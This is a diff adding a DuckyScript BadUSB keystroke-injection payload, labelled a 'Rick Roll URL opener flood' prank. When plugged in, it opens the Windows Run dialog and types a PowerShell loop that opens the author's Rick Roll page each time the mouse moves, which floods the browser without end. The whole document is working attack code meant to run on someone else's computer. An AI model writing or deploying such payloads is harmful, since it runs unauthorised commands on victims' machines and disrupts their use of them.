@@ -1,0 +1,13 @@
+REM Title: Rick Roll URL opener flood 
+REM Author: 7h30th3r0n3
+REM Target:  Tested on Windows 7/8/10 
+REM Version: 1.1
+REM Category: Prank
+REM Launches Powershell when the mouse is moved it open rick roll page 
+REM Taked from jumpscare from I-Am-Jakoby : https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/blob/main/Payloads/Flip-JumpScare-2.0/
+DELAY 1000
+REM Open PowerShell
+GUI r
+DELAY 500
+STRING while ($true) {Add-Type -A System.Windows.Forms;$p=[Windows.Forms.Cursor]::Position.X;while([Windows.Forms.Cursor]::Position.X-eq$p){};start https://7h30th3r0n3.fr/nggyunglyd2/}
+ENTER
